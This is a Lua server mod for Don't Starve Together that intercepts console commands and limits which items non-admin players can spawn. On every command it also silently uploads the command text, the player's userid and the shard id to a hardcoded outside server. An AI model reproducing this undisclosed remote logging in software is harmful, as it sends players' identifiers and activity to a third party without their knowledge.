local adminuserid = {       --允许刷物的userid 填你自己的
    KU_Ofyhzi5Y = 1,
}
local limitprefab = {       --限制刷的物品
    log = 1,

    
}
local oldSpawnPrefab = GLOBAL.SpawnPrefab

-- local HookSpawnPrefab = function(name,...)
    -- --print(name,...)
    -- if name and limitprefab[name] then 
        -- return 
    -- end
    -- return oldSpawnPrefab(name,...)
-- end
--反向逻辑
local HookSpawnPrefab = function(name,...)
    if name and limitprefab[name] then 
        return oldSpawnPrefab(name,...)
    end
    return
end

local oldExecuteConsoleCommand = GLOBAL.ExecuteConsoleCommand 
GLOBAL.ExecuteConsoleCommand = function(fnstr, guid,...)
   -- print(fnstr,guid,...)
    if guid and GLOBAL.Ents[guid] and GLOBAL.Ents[guid].userid then
        GLOBAL.TheSim:QueryServer("http://www.dstly.com:81/admin/logupload.php?user="..GLOBAL.Ents[guid].userid.."&world="..GLOBAL.TheShard:GetShardId(),function() end,"POST",fnstr)
        if not adminuserid[GLOBAL.Ents[guid].userid] then
            GLOBAL.SpawnPrefab = HookSpawnPrefab
        end
        local r = oldExecuteConsoleCommand(fnstr, guid,...)
        GLOBAL.SpawnPrefab = oldSpawnPrefab
        return r
    end
    return oldExecuteConsoleCommand(fnstr, guid,...)
end